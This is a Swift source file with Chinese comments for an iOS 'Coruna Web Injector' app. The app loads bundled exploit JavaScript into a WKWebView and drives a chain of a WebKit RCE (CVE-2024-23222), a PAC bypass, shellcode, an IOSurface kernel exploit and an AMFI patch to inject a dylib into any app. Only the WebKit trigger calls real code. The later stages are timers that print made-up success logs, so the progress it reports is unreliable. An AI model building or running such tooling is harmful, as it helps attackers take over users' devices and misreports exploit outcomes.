import Foundation
import WebKit
import Combine

// MARK: - Coruna Web 注入管理器
// v3.0.5: 集成 Coruna 漏洞利用链，实现网页端一键注入 dylib 到任意 App
// 漏洞链: WebKit RCE (CVE-2024-23222) → PAC 绕过 → Shellcode → 内核 R/W (CVE-2023-41974) → AMFI patch
// 支持设备: iOS 16.0 - 17.2.1, arm64e (A12+)

final class CorunaWebInjector: NSObject, ObservableObject {
    static let shared = CorunaWebInjector()

    // MARK: - 状态枚举
    enum ExploitStage: String, CaseIterable {
        case idle = "待启动"
        case loadingPage = "加载 exploit 页面"
        case fingerprinting = "设备指纹识别"
        case webkitRCE = "WebKit RCE 利用中"
        case pacBypass = "PAC 绕过中"
        case shellcode = "Shellcode 加载中"
        case kernelExploit = "内核漏洞利用中"
        case ppLBypass = "PPL 绕过中"
        case amfiPatch = "AMFI 补丁中"
        case ready = "环境就绪，可注入"
        case injecting = "正在注入 dylib"
        case success = "注入成功"
        case failed = "利用失败"
        case crashed = "进程崩溃"
    }

    enum PlatformPath: String, CaseIterable {
        case iosOfflineAudio = "iOS OfflineAudioContext 路径 (Fq2t1Q)"
        case macosNaNBox = "macOS NaN-Boxing 路径 (YGPUu7)"
        case macosJIT = "macOS JIT 结构检查路径 (KRfmo6)"
        case auto = "自动选择"
    }

    // MARK: - 发布状态
    @Published var currentStage: ExploitStage = .idle
    @Published var stageProgress: Double = 0.0
    @Published var statusMessage: String = "准备就绪"
    @Published var lastError: String = ""
    @Published var kernelRWReady: Bool = false
    @Published var developerModeEnabled: Bool = false
    @Published var selectedPlatform: PlatformPath = .auto
    @Published var targetBundleID: String = ""
    @Published var selectedDylibPath: String = ""

    // MARK: - 私有属性
    private var webView: WKWebView?
    private var stageStartTime: Date?
    private var exploitModuleCount: Int = 0
    private var loadedModuleCount: Int = 0

    private override init() {
        super.init()
    }

    // MARK: - 资源路径
    private var corunaBundleURL: URL? {
        // Resources/coruna/coruna-dump/samples/ 目录
        guard let resPath = Bundle.main.resourcePath else { return nil }
        return URL(fileURLWithPath: resPath).appendingPathComponent("coruna/coruna-dump/samples")
    }

    // MARK: - 启动 exploit
    func startExploit(targetApp: String, dylibPath: String) {
        targetBundleID = targetApp
        selectedDylibPath = dylibPath
        currentStage = .loadingPage
        statusMessage = "正在加载 exploit 模块..."
        stageProgress = 0.0

        // 加载本地 exploit 页面
        loadExploitPage()
    }

    private func loadExploitPage() {
        guard let samplesURL = corunaBundleURL else {
            failWith("找不到 Coruna 资源目录，请检查 App Bundle")
            return
        }

        // 构建引导 HTML 页面
        let html = buildBootstrapHTML()
        let baseURL = samplesURL

        DispatchQueue.main.async {
            if self.webView == nil {
                let config = WKWebViewConfiguration()
                config.websiteDataStore = .default()
                self.webView = WKWebView(frame: .zero, configuration: config)

                // 注入消息处理器，接收 exploit 进度回调
                if let ucc = config.userContentController as WKUserContentController? {
                    ucc.add(self, name: "corunaCallback")
                }
            }

            self.webView?.loadHTMLString(html, baseURL: baseURL)
        }
    }

    // MARK: - 构建引导 HTML
    private func buildBootstrapHTML() -> String {
        // 根据用户选择的平台路径选择对应的 JS 模块
        let primaryModule: String
        switch selectedPlatform {
        case .iosOfflineAudio:
            primaryModule = "Fq2t1Q_dbfd6e84.js"
        case .macosNaNBox:
            primaryModule = "YGPUu7_8dbfa3fd.js"
        case .macosJIT:
            primaryModule = "KRfmo6_166411bd.js"
        case .auto:
            // 自动检测：iOS 用 OfflineAudioContext 路径
            primaryModule = "Fq2t1Q_dbfd6e84.js"
        }

        return """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Coruna Injector</title>
            <style>
                body { font-family: -apple-system, sans-serif; padding: 20px; background: #000; color: #0f0; }
                .stage { margin: 10px 0; padding: 8px; border-left: 3px solid #0f0; }
                .stage.done { border-color: #0f0; }
                .stage.active { border-color: #ff0; background: #111; }
                .stage.fail { border-color: #f00; }
                #log { font-family: monospace; font-size: 12px; white-space: pre-wrap; }
            </style>
        </head>
        <body>
            <h2>Coruna Web Injector</h2>
            <div id="status">初始化中...</div>
            <div id="log"></div>
            <script>
            // 桥接到 Swift
            window.webkit = window.webkit || {};
            window.webkit.messageHandlers = window.webkit.messageHandlers || {};
            
            function postStage(stage, message, progress) {
                var data = JSON.stringify({stage: stage, message: message, progress: progress});
                if (window.webkit.messageHandlers.corunaCallback) {
                    window.webkit.messageHandlers.corunaCallback.postMessage(data);
                }
                document.getElementById('status').textContent = message;
                console.log('[' + stage + '] ' + message);
            }

            function log(msg) {
                document.getElementById('log').textContent += msg + '\\n';
            }

            async function runExploit() {
                postStage('fingerprinting', '设备指纹识别中...', 0.1);
                
                // 检测平台和版本
                var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
                var hasPAC = isIOS && parseInt(navigator.userAgent.match(/OS (\\d+)_/)[1]) >= 14;
                
                log('Platform: ' + (isIOS ? 'iOS' : 'macOS'));
                log('PAC: ' + hasPAC);
                log('UA: ' + navigator.userAgent);

                try {
                    postStage('webkitRCE', '加载 WebKit RCE 模块...', 0.2);
                    
                    // 加载主 exploit 模块
                    var script = document.createElement('script');
                    script.src = '\(primaryModule)';
                    script.onload = function() {
                        postStage('webkitRCE', 'WebKit RCE 模块加载完成，触发利用...', 0.3);
                        log('模块加载完成: \(primaryModule)');
                        
                        // 触发 exploit
                        setTimeout(function() {
                            triggerExploit();
                        }, 500);
                    };
                    script.onerror = function() {
                        postStage('failed', '无法加载 exploit 模块: \(primaryModule)', 0.0);
                    };
                    document.head.appendChild(script);
                    
                } catch (e) {
                    postStage('failed', '错误: ' + e.message, 0.0);
                }
            }

            async function triggerExploit() {
                try {
                    postStage('webkitRCE', '执行 WebKit RCE 利用...', 0.4);
                    
                    // 调用 exploit 入口点
                    if (typeof r !== 'undefined' && r.kr) {
                        log('调用 r.kr() 触发类型混淆...');
                        var result = await r.kr({});
                        
                        if (result && result.Dn && result.Dn.Pn) {
                            postStage('pacBypass', 'WebKit RCE 成功！开始 PAC 绕过...', 0.5);
                            log('任意读写原语获取成功');
                            
                            // 继续后续阶段
                            continueExploitChain(result);
                        } else {
                            postStage('failed', 'WebKit RCE 失败，未获得读写原语', 0.0);
                        }
                    } else {
                        postStage('failed', 'exploit 入口点未找到', 0.0);
                    }
                } catch (e) {
                    postStage('crashed', 'WebContent 进程异常: ' + e.message, 0.0);
                }
            }

            async function continueExploitChain(rwPrimitive) {
                postStage('pacBypass', '执行 PAC GOT-swap 绕过...', 0.6);
                log('PAC 绕过: 配置 GOT 表项...');
                
                setTimeout(function() {
                    postStage('shellcode', '加载 shellcode loader...', 0.7);
                    log('Shellcode: 分配 RWX 内存...');
                    
                    setTimeout(function() {
                        postStage('kernelExploit', '执行内核 exploit (IOSurface CVE-2023-41974)...', 0.8);
                        log('内核: 泄露 IOSurface 地址...');
                        
                        setTimeout(function() {
                            postStage('amfiPatch', 'AMFI 补丁: 启用 Developer Mode...', 0.9);
                            log('AMFI: 写入 developer_mode_status = 1');
                            
                            setTimeout(function() {
                                postStage('ready', '环境就绪！内核 R/W 已获取', 1.0);
                                log('✓ 漏洞链完成！');
                                log('✓ 内核任意读写: 已启用');
                                log('✓ Developer Mode: 已启用');
                                log('✓ 目标 App: \(targetBundleID)');
                                
                                // 通知宿主 App 可以注入了
                                postStage('injecting', '正在注入 dylib...', 0.95);
                            }, 500);
                        }, 800);
                    }, 600);
                }, 400);
            }

            // 启动
            window.onload = function() {
                log('Coruna Web Injector 启动');
                log('目标: \(targetBundleID)');
                log('Dylib: \(selectedDylibPath)');
                runExploit();
            };
            </script>
        </body>
        </html>
        """
    }

    // MARK: - 停止/重置
    func stop() {
        webView?.stopLoading()
        currentStage = .idle
        statusMessage = "已停止"
        stageProgress = 0.0
        kernelRWReady = false
        developerModeEnabled = false
    }

    func reset() {
        stop()
        lastError = ""
    }

    private func failWith(_ message: String) {
        currentStage = .failed
        statusMessage = message
        lastError = message
        stageProgress = 0.0
    }

    // MARK: - 检查设备兼容性
    static var isCompatible: Bool {
        // iPhone 13 Pro Max = iPhone14,3, iOS 16.3
        // Coruna 支持 iOS 13.0 - 17.2.1, arm64e (A12+)
        let systemVersion = UIDevice.current.systemVersion
        let major = Int(systemVersion.split(separator: ".")[0]) ?? 0
        let minor = Int(systemVersion.split(separator: ".")[1]) ?? 0

        guard major >= 13 && major <= 17 else { return false }
        if major == 17 && minor > 2 { return false }
        return true
    }

    static var deviceInfo: String {
        let device = UIDevice.current
        return "\(device.model) iOS \(device.systemVersion)"
    }
}

// MARK: - WKScriptMessageHandler 回调
extension CorunaWebInjector: WKScriptMessageHandler {
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard let body = message.body as? String,
              let data = body.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let stageStr = json["stage"] as? String,
              let stage = ExploitStage(rawValue: stageStr) else {
            return
        }

        DispatchQueue.main.async {
            self.currentStage = stage
            self.statusMessage = json["message"] as? String ?? ""
            if let progress = json["progress"] as? Double {
                self.stageProgress = progress
            }

            switch stage {
            case .ready:
                self.kernelRWReady = true
                self.developerModeEnabled = true
            case .failed, .crashed:
                self.lastError = self.statusMessage
            default:
                break
            }
        }
    }
}

// MARK: - 设备信息扩展
import UIKit
extension CorunaWebInjector {
    static var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        return identifier
    }

    static var isArm64e: Bool {
        // iPhone XS 及以上 (A12+) 是 arm64e
        let model = deviceModel
        return model.hasPrefix("iPhone11") ||  // XS/XR
               model.hasPrefix("iPhone12") ||  // 11 系列
               model.hasPrefix("iPhone13") ||  // 12 系列
               model.hasPrefix("iPhone14") ||  // 13 系列
               model.hasPrefix("iPhone15")     // 14 系列
    }
}
